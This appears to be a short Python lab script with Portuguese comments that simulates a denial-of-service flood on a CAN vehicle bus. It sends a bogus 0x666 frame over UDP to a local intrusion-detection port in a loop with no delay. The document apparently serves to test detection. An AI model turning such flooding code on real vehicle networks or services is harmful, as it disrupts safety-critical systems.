import can
import socket

IP_LOCAL = "127.0.0.1"
PORTA_IDS = 5000
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("🔥 Iniciando Ataque DoS (Flooding)...")
print("Injetando pacotes maliciosos na rede. Pressione Ctrl+C para parar.")

try:
    while True:
        # ID malicioso (0x666) com carga inútil para afogar a rede
        msg = can.Message(
            arbitration_id=0x666,
            data=[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
            is_extended_id=False
        )
        
        # Envia via UDP repetidamente, SEM O time.sleep()! 
        # Isso vai disparar milhares de vezes por segundo.
        mensagem_texto = str(msg)
        sock.sendto(mensagem_texto.encode(), (IP_LOCAL, PORTA_IDS))

except KeyboardInterrupt:
    print("\nAtaque abortado.")